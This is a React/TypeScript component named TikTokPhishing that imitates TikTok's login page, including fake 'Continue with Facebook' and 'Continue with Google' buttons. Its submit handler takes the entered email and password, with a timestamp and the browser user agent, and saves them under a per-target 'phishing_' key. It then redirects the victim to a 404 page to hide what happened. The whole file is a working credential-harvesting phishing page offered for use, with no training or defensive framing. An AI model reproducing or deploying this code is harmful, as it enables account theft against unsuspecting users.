
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const TikTokPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'TikTok',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center mb-6">
            <div className="w-12 h-12 bg-black rounded-lg flex items-center justify-center mr-3">
              <span className="text-white text-2xl">🎵</span>
            </div>
            <h1 className="text-3xl font-bold text-black">TikTok</h1>
          </div>
          <h2 className="text-2xl font-semibold text-gray-900 mb-2">Log in to TikTok</h2>
          <p className="text-gray-600">Manage your account, check notifications, comment on videos, and more.</p>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-900 mb-2">
              Email or username
            </label>
            <Input
              type="text"
              placeholder="Email or username"
              value={formData.email}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
              className="w-full h-12 px-4 border border-gray-300 rounded text-gray-900 bg-white focus:border-red-500"
              required
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-900 mb-2">
              Password
            </label>
            <Input
              type="password"
              placeholder="Password"
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
              className="w-full h-12 px-4 border border-gray-300 rounded text-gray-900 bg-white focus:border-red-500"
              required
            />
          </div>

          <div className="text-right">
            <a href="#" className="text-red-500 text-sm">Forgot password?</a>
          </div>

          <Button 
            type="submit"
            className="w-full bg-red-500 hover:bg-red-600 text-white h-12 text-lg font-semibold rounded"
          >
            Log in
          </Button>
        </form>

        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-gray-300"></div>
          <span className="px-4 text-gray-500 text-sm">Or</span>
          <div className="flex-1 border-t border-gray-300"></div>
        </div>

        <div className="space-y-3">
          <Button className="w-full bg-transparent border border-gray-300 text-gray-700 h-12 font-semibold rounded hover:bg-gray-50 flex items-center justify-center">
            <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="#1877f2">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Continue with Facebook
          </Button>
          
          <Button className="w-full bg-transparent border border-gray-300 text-gray-700 h-12 font-semibold rounded hover:bg-gray-50 flex items-center justify-center">
            <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="#4285f4">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            Continue with Google
          </Button>
        </div>

        <div className="text-center mt-6">
          <p className="text-sm text-gray-600">
            Don't have an account? 
            <a href="#" className="text-red-500 font-semibold ml-1">Sign up</a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default TikTokPhishing;
